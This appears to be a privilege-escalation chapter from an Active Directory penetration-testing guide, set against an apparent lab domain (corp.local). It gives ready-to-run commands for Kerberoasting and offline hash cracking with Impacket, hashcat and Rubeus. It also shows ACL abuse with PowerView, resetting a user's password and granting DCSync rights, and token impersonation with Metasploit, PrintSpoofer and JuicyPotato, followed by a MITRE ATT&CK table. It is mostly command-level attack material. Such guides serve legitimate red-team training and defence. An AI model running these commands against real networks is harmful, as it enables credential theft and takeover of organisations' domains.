# ⬆️ Phase 4: Privilege Escalation

Escalate from a low-privileged domain user to higher-privileged accounts, ultimately aiming for Domain Admin.

---

## 4.1 Kerberoasting

Request TGS tickets for service accounts and crack them offline.

```bash
# From Kali using Impacket
python3 GetUserSPNs.py corp.local/jsmith:Password123! -dc-ip 192.168.56.10 -request

# Save to file and crack
python3 GetUserSPNs.py corp.local/jsmith:Password123! -dc-ip 192.168.56.10 -request -outputfile kerberoast.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt

# From Windows using Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt
```

---

## 4.2 ACL/ACE Abuse

```powershell
# Find interesting ACLs
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "Write"}

# If you have GenericAll on a user, reset their password
Set-DomainUserPassword -Identity jdoe -AccountPassword (ConvertTo-SecureString 'Hacked123!' -AsPlainText -Force)

# If you have WriteDACL, give yourself DCSync rights
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity jsmith -Rights DCSync
```

---

## 4.3 Token Impersonation

```bash
# Using Metasploit after initial shell
use incognito
list_tokens -u
impersonate_token "CORP\\adm-user"

# Using PrintSpoofer (local admin → SYSTEM)
.\PrintSpoofer.exe -i -c cmd

# Using Juicy/Sweet Potato
.\JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}
```

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
| Kerberoasting | T1558.003 | SPN ticket offline crack |
| Abuse Elevation Control | T1548 | Token impersonation |
| Domain Policy Modification | T1484 | ACL abuse, DCSync rights |
